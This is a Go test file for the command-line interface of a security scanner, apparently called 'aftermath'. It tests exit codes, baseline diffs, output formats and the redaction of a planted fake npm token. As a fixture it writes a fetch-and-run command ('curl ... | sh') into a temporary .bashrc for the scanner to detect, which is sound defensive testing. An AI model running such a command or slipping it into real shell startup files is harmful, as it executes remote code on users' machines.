package cli

import (
	"bytes"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

func TestExitCodesAndBaseline(t *testing.T) {
	home := t.TempDir()
	sys := t.TempDir()
	temp := t.TempDir()
	mustWrite(t, filepath.Join(home, ".bashrc"), "export PATH=\"$HOME/.local/bin:$PATH\"\n")
	args := []string{"--home", home, "--system-root", sys, "--temp-dir", temp, "--platform", "linux", "--username", "dev"}

	var out, err bytes.Buffer
	if code := Run(append([]string{"scan"}, args...), &out, &err); code != 0 {
		t.Fatalf("clean scan code %d %s %s", code, out.String(), err.String())
	}
	if !strings.Contains(out.String(), "aftermath") {
		t.Fatal(out.String())
	}

	mustWrite(t, filepath.Join(home, ".bashrc"), "curl https://example.invalid/x | sh\n")
	out.Reset()
	err.Reset()
	if code := Run(append([]string{"scan", "--fail-on", "high"}, args...), &out, &err); code != 1 {
		t.Fatalf("dirty scan code %d\n%s", code, out.String())
	}
	out.Reset()
	if code := Run(append([]string{"scan", "--fail-on", "critical"}, args...), &out, &err); code != 0 {
		t.Fatalf("fail-on critical code %d\n%s", code, out.String())
	}

	base := filepath.Join(t.TempDir(), "base.json")
	out.Reset()
	if code := Run(append([]string{"baseline", "save", base}, args...), &out, &err); code != 0 {
		t.Fatalf("save %d %s", code, err.String())
	}
	fi, statErr := os.Stat(base)
	if statErr != nil {
		t.Fatal(statErr)
	}
	if runtime.GOOS != "windows" && fi.Mode().Perm() != 0o600 {
		t.Fatalf("mode %v", fi.Mode())
	}
	out.Reset()
	if code := Run(append([]string{"diff", base}, args...), &out, &err); code != 0 {
		t.Fatalf("unchanged diff %d\n%s", code, out.String())
	}
	if strings.Contains(out.String(), "curl") {
		t.Fatal("unchanged diff listed the existing line")
	}

	mustWrite(t, filepath.Join(home, ".npmrc"), "//registry.npmjs.org/:_authToken=npm_DemoTokenValueShouldNeverPrint0001\n")
	out.Reset()
	if code := Run(append([]string{"diff", base, "--format", "json"}, args...), &out, &err); code != 1 {
		t.Fatalf("new finding diff %d\n%s", code, out.String())
	}
	if !strings.Contains(out.String(), `"change": "new"`) {
		t.Fatalf("missing change field %s", out.String())
	}
	if strings.Contains(out.String(), "npm_DemoTokenValueShouldNeverPrint0001") {
		t.Fatal("token leaked in diff json")
	}

	for _, format := range []string{"text", "markdown", "sarif"} {
		out.Reset()
		if code := Run(append([]string{"scan", "--format", format}, args...), &out, &err); code != 1 {
			t.Fatalf("%s code %d", format, code)
		}
		if strings.Contains(out.String(), "npm_DemoTokenValueShouldNeverPrint0001") {
			t.Fatalf("token leaked in %s", format)
		}
		if format == "sarif" && !strings.Contains(out.String(), `"version": "2.1.0"`) {
			t.Fatal("sarif version")
		}
	}
}

func TestUsageErrors(t *testing.T) {
	var out, err bytes.Buffer
	if code := Run(nil, &out, &err); code != 2 {
		t.Fatal(code)
	}
	if code := Run([]string{"version"}, &out, &err); code != 0 || !strings.Contains(out.String(), "0.1.0") {
		t.Fatalf("%d %s", code, out.String())
	}
	err.Reset()
	if code := Run([]string{"scan", "--home", filepath.Join(t.TempDir(), "missing")}, &out, &err); code != 2 {
		t.Fatalf("missing home %d %s", code, err.String())
	}
	err.Reset()
	if code := Run([]string{"scan", "--format", "xml", "--home", t.TempDir()}, &out, &err); code != 2 {
		t.Fatal(code)
	}
	err.Reset()
	if code := Run([]string{"diff", filepath.Join(t.TempDir(), "nope.json"), "--home", t.TempDir(), "--temp-dir", t.TempDir(), "--system-root", t.TempDir()}, &out, &err); code != 2 {
		t.Fatal(code)
	}
}

func mustWrite(t *testing.T, path, body string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}
